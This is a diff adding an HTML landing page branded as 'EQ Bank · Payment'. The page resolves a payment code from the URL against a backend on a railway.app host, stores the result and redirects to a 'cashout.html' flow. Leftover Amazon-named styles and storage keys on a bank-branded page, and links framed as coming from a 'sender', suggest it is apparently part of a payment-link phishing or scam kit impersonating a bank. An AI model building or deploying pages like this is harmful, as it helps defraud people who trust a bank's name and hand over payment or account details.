@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#131921">
+<title>EQ Bank · Payment</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --amz-ink: #131921;
+    --amz-orange: #FF861F;
+    --amz-orange-hover: #F07800;
+    --amz-muted: #565959;
+    --amz-border: #E7E9EC;
+    --amz-success: #067D62;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #EEF0F2; color: #0F1111;
+    -webkit-font-smoothing: antialiased; line-height: 1.4;
+    min-height: 100dvh; display: flex; justify-content: center; align-items: center;
+    padding: 0;
+  }
+  .phone {
+    width: 100%; max-width: 400px; background: #FFFFFF;
+    min-height: 100dvh; display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 32px 24px; text-align: center;
+  }
+  @media (min-width: 520px) {
+    body { padding: 20px 0; }
+    .phone {
+      min-height: auto; height: calc(100dvh - 40px); max-height: 760px;
+      border-radius: 22px;
+      box-shadow: 0 24px 70px rgba(19,25,33,0.18), 0 4px 14px rgba(19,25,33,0.08);
+    }
+  }
+  .brand-mark {
+    width: 64px; height: 64px; border-radius: 16px;
+    background: linear-gradient(135deg, var(--amz-orange), var(--amz-orange-hover));
+    display: flex; align-items: center; justify-content: center;
+    color: var(--amz-ink); font-weight: 800; font-size: 22px; letter-spacing: -0.5px;
+    box-shadow: 0 8px 24px rgba(255,134,31,0.32); margin-bottom: 22px;
+  }
+  .brand-name { font-size: 20px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; margin-bottom: 4px; }
+  .brand-sub { font-size: 12px; color: var(--amz-muted); margin-bottom: 28px; }
+
+  .spinner {
+    width: 44px; height: 44px;
+    border: 4px solid #E5E7EB;
+    border-top-color: var(--amz-orange);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+    margin-bottom: 20px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .status-title { font-size: 16px; font-weight: 700; color: var(--amz-ink); margin-bottom: 6px; }
+  .status-desc { font-size: 13px; color: var(--amz-muted); line-height: 1.6; max-width: 300px; margin: 0 auto; }
+
+  .error-box { display: none; }
+  .error-box.show { display: block; }
+  .error-icon {
+    width: 64px; height: 64px; border-radius: 50%;
+    background: #FDECEA; color: #B12704;
+    display: inline-flex; align-items: center; justify-content: center;
+    margin-bottom: 18px;
+  }
+  .error-icon svg { width: 32px; height: 32px; stroke: currentColor; fill: none; stroke-width: 2.4; stroke-linecap: round; stroke-linejoin: round; }
+  .error-title { font-size: 17px; font-weight: 800; color: var(--amz-ink); margin-bottom: 6px; }
+  .error-desc { font-size: 13px; color: var(--amz-muted); line-height: 1.6; max-width: 300px; margin: 0 auto; }
+
+  .loading-box { display: block; }
+  .loading-box.hide { display: none; }
+
+  .footnote { margin-top: 28px; font-size: 11px; color: var(--amz-muted); }
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <div class="brand-mark">EQ</div>
+  <div class="brand-name">EQ Bank</div>
+  <div class="brand-sub">Secure payment</div>
+
+  <div class="loading-box" id="loadingBox">
+    <div class="spinner"></div>
+    <div class="status-title">Loading your payment…</div>
+    <div class="status-desc">Please wait while we fetch the payment details.</div>
+  </div>
+
+  <div class="error-box" id="errorBox">
+    <div class="error-icon">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4"/><path d="M12 16h.01"/></svg>
+    </div>
+    <div class="error-title" id="errorTitle">Payment link unavailable</div>
+    <div class="error-desc" id="errorDesc">This payment link is invalid or has expired. Please ask the sender to generate a new link.</div>
+  </div>
+
+  <div class="footnote">Powered by EQ Bank</div>
+
+</div>
+
+<script>
+  const API_BASE = 'https://mobile-eq-banking-production.up.railway.app';
+
+  function fail(title, desc) {
+    document.getElementById('loadingBox').classList.add('hide');
+    if (title) document.getElementById('errorTitle').textContent = title;
+    if (desc)  document.getElementById('errorDesc').textContent  = desc;
+    document.getElementById('errorBox').classList.add('show');
+  }
+
+  async function boot() {
+    // 1) Extract short code from pathname: /ABC12345
+    const pathMatch = location.pathname.match(/^\/([A-Za-z0-9-]{6,20})\/?$/);
+    let code = pathMatch ? pathMatch[1].toUpperCase() : '';
+
+    // 2) Fallback: ?r= query param
+    if (!code) {
+      const q = new URLSearchParams(location.search).get('r');
+      if (q) code = q.trim().toUpperCase();
+    }
+
+    // 3) No code at all → error
+    if (!code) {
+      fail('Missing payment code',
+           'This page needs a valid payment code. Please open the link sent to you by the sender.');
+      return;
+    }
+
+    // 4) Validate against the backend before handing off
+    let payload = null;
+    try {
+      const res = await fetch(API_BASE + '/api/links/' + encodeURIComponent(code));
+      if (res.status === 410) {
+        const body = await res.json().catch(() => ({}));
+        const exp = body.expiresAt ? new Date(body.expiresAt).toLocaleString() : '';
+        fail('Payment link expired',
+             exp ? 'This link expired on ' + exp + '. Please request a new one from the sender.'
+                 : 'This link has expired. Please request a new one from the sender.');
+        return;
+      }
+      if (!res.ok) {
+        fail();
+        return;
+      }
+      payload = await res.json();
+    } catch (e) {
+      fail('Network error',
+           'We could not reach the payment server. Please check your connection and try again.');
+      return;
+    }
+
+    if (!payload || !payload.ok) {
+      fail();
+      return;
+    }
+
+    // 5) Stash payload for downstream pages, then hand off to cash-out flow
+    try {
+      sessionStorage.setItem('amz_payload', JSON.stringify(payload));
+    } catch (e) {}
+
+    // Preserve the code in the URL so cashout.html can re-resolve if it needs to
+    const next = 'cashout.html?r=' + encodeURIComponent(code);
+    location.replace(next);
+  }
+
+  document.addEventListener('DOMContentLoaded', boot);
+</script>
+</body>
+</html>
